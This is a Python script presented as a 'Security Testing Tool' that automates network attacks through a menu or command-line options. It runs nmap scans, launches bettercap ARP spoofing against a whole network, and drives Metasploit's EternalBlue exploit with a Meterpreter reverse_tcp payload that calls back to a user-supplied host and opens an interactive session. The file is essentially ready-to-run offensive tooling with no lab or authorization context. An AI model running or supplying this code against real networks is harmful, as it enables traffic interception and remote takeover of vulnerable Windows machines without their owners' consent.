import sys
import subprocess
import nmap
import pexpect
import ipaddress

def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def validate_network(network_str):
    try:
        ipaddress.ip_network(network_str)
        return True
    except ValueError:
        return False

def get_target_network():
    while True:
        network = input("Enter target network (e.g., 192.168.1.0/24): ")
        if validate_network(network):
            return network
        print("Invalid network format. Please try again.")

def get_target_ip():
    while True:
        ip = input("Enter target IP address: ")
        if validate_ip(ip):
            return ip
        print("Invalid IP address format. Please try again.")

def nmap_scan(target_network):
    try:
        scanner = nmap.PortScanner()
        scanner.scan(target_network, arguments='-sV -O')
        hosts = scanner.all_hosts()
        
        if not hosts:
            print("No hosts found")
            return None
            
        for host in hosts:
            try:
                print(f"Host: {host}")
                print(f"State: {scanner[host].state()}")
                for proto in scanner[host].all_protocols():
                    print(f"Protocol: {proto}")
                    lport = scanner[host][proto].keys()
                    for port in lport:
                        print(f"Port: {port}\tService: {scanner[host][proto][port]['name']}")
            except KeyError as e:
                print(f"Error processing host {host}: {e}")
                
        return scanner
    except nmap.PortScannerError as e:
        print(f"Nmap scan failed: {e}")
        sys.exit(1)
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)
        return None

def bettercap_attack(target_network):
    try:
        print("Running bettercap attack...")
        print(f"Starting bettercap ARP spoofing attack on {target_network}...")
        
        cmd = [
            'bettercap',
            '-eval',
            f'set arp.spoof.fullduplex true; set arp.spoof.targets {target_network}; arp.spoof on'
        ]
        
        subprocess.run(
            cmd,
            shell=False,
            check=True,
            capture_output=True,
            text=True
        )
        print("Attack completed.")
    except subprocess.CalledProcessError as e:
        print(f"Bettercap attack failed: {e}")
        print(f"Error output: {e.stderr}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def metasploit_exploit(target_ip, lhost):
    try:
        child = pexpect.spawn("/usr/bin/msfconsole")
        
        child.expect("msf>", timeout=30)
        child.sendline("use exploit/windows/smb/ms17_010_eternalblue")
        child.expect("ms17_010_eternalblue")
        
        child.sendline(f"set RHOST {target_ip}")
        child.expect("RHOST =>")
        
        child.sendline("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
        child.expect("PAYLOAD =>")
        if validate_ip(lhost):
            child.sendline(f"set LHOST {lhost}")
            child.expect("LHOST =>")
        else:
            print("Invalid local IP address")
            return
        
        child.sendline("exploit")
        child.expect("Meterpreter session")
        print("Exploit successful! Meterpreter session opened.")
        
        child.interact()
    except pexpect.ExceptionPexpect as e:
        print(f"Metasploit exploit failed: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def main_menu():
    while True:
        print("\n=== Security Testing Tool ===")
        print("1. Run Nmap Scan")
        print("2. Run Bettercap Attack")
        print("3. Run Metasploit Exploit")
        print("4. Exit")
        
        choice = input("\nEnter your choice (1-4): ")
        
        if choice == '1':
            target_network = get_target_network()
            nmap_scan(target_network)
        elif choice == '2':
            target_network = get_target_network()
            bettercap_attack(target_network)
        elif choice == '3':
            target_ip = get_target_ip()
            lhost = input("Enter your local IP for reverse connection: ")
            metasploit_exploit(target_ip, lhost)
        elif choice == '4':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        main_menu()
        sys.exit()

    option = sys.argv[1]

    if option == "nmap":
        if len(sys.argv) != 3:
            print("Please provide network IP.")
            sys.exit(1)
        nmap_scan(sys.argv[2])
    elif option == "bettercap":
        if len(sys.argv) != 3:
            print("Please provide network IP.")
            sys.exit(1)
        bettercap_attack(sys.argv[2])
    elif option == "metasploit":
        if len(sys.argv) != 4:
            print("Please provide network IP.")
            sys.exit(1)
        metasploit_exploit(sys.argv[2], sys.argv[3])
    else:
        print(f"Invalid option: {option}")
        print("Options: nmap, bettercap, metasploit")
        sys.exit(1)